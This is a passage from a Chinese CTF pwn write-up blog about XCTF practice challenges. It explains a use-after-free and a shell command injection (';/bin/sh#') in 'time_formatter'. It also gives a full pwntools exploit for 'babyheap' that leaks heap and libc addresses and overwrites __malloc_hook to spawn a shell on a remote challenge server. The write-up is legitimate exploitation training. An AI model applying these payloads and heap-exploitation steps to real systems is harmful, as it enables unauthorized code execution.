__readfsqword(0x28u);</span><br><span class="line">  free__(ptr);</span><br><span class="line">  free__(value);</span><br><span class="line">  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  if ( (s &amp; 0xDF) == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;OK, exiting.&quot;);</span><br><span class="line">    result = 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="分析-amp-amp-exp"><a href="#分析-amp-amp-exp" class="headerlink" title="分析&amp;&amp;exp"></a>分析&amp;&amp;exp</h2><p>问题出在退出时先free然后再询问是否退出，这个时候选择不退出的话就会出现UAF漏洞</p>
<p>在system中执行command命令，command字符串通过snprintf_chk函数拼接起来，可以百度一下这个函数的用法，注意字符串/bin/date -d @%d +’%s’，按照linux 64的函数传参顺序，分别是rdi rsi rdx rcx r8 r9 然后是栈 ，所以此时%s对应第一个入栈的参数，也就是rax 也就是qword_602118，所以只要控制了qword_602118，就可以执行任意系统命令（注意闭合单引号）。</p>
<p>所以依次执行 1，5 / N ，3 / ‘;/bin/sh#’ , 4 即可</p>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>正常题目，edit时没有检查存储的size</p>
<p>所以虽然保护全开，我们仍然可以使用溢出来overlap来泄露地址及其他</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./babyheap&apos;)</span><br><span class="line">sh = remote(&apos;111.198.29.45&apos;,&apos;31717&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def new(length,con):</span><br><span class="line">	sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">	sh.sendline(str(length))</span><br><span class="line">	sh.send(con)</span><br><span class="line"></span><br><span class="line">def edit(idx,length,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.sendline(str(length))</span><br><span class="line">	sh.send(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x10,&apos;a&apos;*0x10)  #0</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">new(0x10,&apos;c&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;d&apos;*0x10)  #3</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line"></span><br><span class="line">#--------------leak heap base----------------</span><br><span class="line">edit(0,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">dele(1)</span><br><span class="line">new(0x30,&apos;b&apos;*0x18+p64(0x21)+&apos;c&apos;*0x10)  #1</span><br><span class="line">dele(4)</span><br><span class="line">dele(2)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(p64(0x21))</span><br><span class="line">heap = u64(sh.recv(8))-0x80</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap)</span><br><span class="line">#--------------leak libc base----------------</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line">new(0x10,&apos;f&apos;*0x10)  #5</span><br><span class="line"></span><br><span class="line">new(0x10,&apos;deadbeef&apos;*2) #6</span><br><span class="line">#new(0x90,&apos;c&apos;*0x90)</span><br><span class="line"></span><br><span class="line">edit(0,0x28,&apos;a&apos;*0x18+p64(0xa1)+&apos;a&apos;*8)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(1)</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(2)</span><br><span class="line">main_arena = u64(sh.recv(8))-88</span><br><span class="line">malloc_hook = main_arena - 0x10</span><br><span class="line">libc.base = malloc_hook - libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">one_gadget = libc.base+0x4526a</span><br><span class="line">print &apos;libc: &apos;+hex(libc.base)</span><br><span class="line">#------------hjack malloc_hook to getshell----------</span><br><span class="line">new(0x70,&apos;c&apos;*0x60+p64(0)+p64(0x31))  #2 &amp; 7</span><br><span class="line">edit(1,0x28,&apos;b&apos;*0x18+p64(0x71)+&apos;c&apos;*8)</span><br><span class="line">dele(7)</span><br><span class="line">edit(2,8,p64(main_arena-0x33))</span><br><span class="line">new(0x60,&apos;c&apos;*0x60)</span><br><span class="line">new(0x63,&apos;a&apos;*0x13+p64(one_gadget)+p64(0)*9)</span><br><span class="line">new(1,&apos;a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2019-04-22T12:03:12.235Z" itemprop="dateUpdated">2019-04-22 20:03:12</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2019/04/06/攻防世界-pwn-prac/" target="_blank" rel="external">http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/</a>
        
    </div>
    <footer>
        <a href="http://siriuswhiter.tk">
            <img src="/img/avatar.jpg" alt="Sirius Whiter">
            Sirius Whiter
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/&title=《攻防世界-pwn prac》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/&title=《攻防世界-pwn prac》 — Room of Requirement&source=菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2019/04/08/escape-from-python-jail/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Escape from python-jail</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/04/01/sql-injection/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Sql Injection</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#100levels"><span class="post-toc-number">1.</span> <span class="post-toc-text">100levels</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路一"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">思路一</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路二"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">思路二</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#monkey"><span class="post-toc-number">2.</span> <span class="post-toc-text">monkey</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-amp-分析-amp-exp"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">题目 &amp; 分析 &amp; exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Escape-From-Jail-50"><span class="post-toc-number">3.</span> <span class="post-toc-text">Escape_From_Jail-50</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-1"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析-amp-exp"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">分析 &amp; exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#time-formatter"><span class="post-toc-number">4.</span> <span class="post-toc-text">time_formatter</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-2"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析-amp-amp-exp"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">分析&amp;&amp;exp</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#babyheap"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">babyheap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-amp-amp-分析"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">题目&amp;&amp;分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        请我喝奶茶呀
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    
</div>

        <footer class="footer">
    
    <div class="top">
        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Sirius Whiter &copy; 2018 - 2020
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/&title=《攻防世界-pwn prac》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/&title=《攻防世界-pwn prac》 — Room of Requirement&source=菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACI0lEQVR42u3ay27EIAwF0P7/T6dSV5VGQ64xfQQOqyqdACcLC2x/fMTj+hqvT74/v17Gu3nGb717d8HAwMB4LOMajoSRzDD+NON1o5kxMDAOYCTL5FvJ5x//PlkXAwMDo3qkq4bOJOBiYGBgVAPueBP9kIqBgYHRucQm/80vpXOBeMFdHAMD44GMamHgN//+wfoGBgbGQxhXY+QFzv5bNzvBwMDYmjG+aibxLWmkqMbJudkwMDD2Zqy6duapsU7R9ObTY2BgbMeopvLzUkFyGa6G4LfzYGBgbM1INpEDOqXKuaCPgYFxAiMJfwkpAVTLkHlZFAMD4zRG/8na8B0FZQwMjK0Zc40O1YT+XAsFBgYGxrhLoRpA5w6F1XcLlQ0MDIyNGNXiYrWcuaq0ueCEi4GB8XBGvon+9XWuJHCDxMDAOIZRbZtYNVvOW7wwBgbGQxjjiTotFNXw3U/PYWBgnMDop8PmCpmdD/e2MICBgbE1Iwm71VRap/2rcGTEwMA4hpFvq5OSyxmFIyMGBsbBjLkGiGoxslM0xcDAOIHRmTo/RFYvzK3mDAwMjI0YV3F0jomdX95crTEwMLZm9MuceVzPl/yDai0GBsa/Z1SDbHWB6nFwbg8YGBgnMObaxeZKj3NR/2Z+DAwMjHbDRHVb5ZQcBgYGRqMYUP1AC1JpGBgYmzI65clOu0Z+uCw0WGBgYGzH6AflfkItARTawjAwMPZhfAJBb1bkIl807AAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>

<!-- third-party -->
<script type="text/javascript">
;( function( $ ) {

	$( '.swipebox' ).swipebox({
		hideCloseButtonOnMobile: true
	});

} )( jQuery );
</script>






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    
</body>
</html>
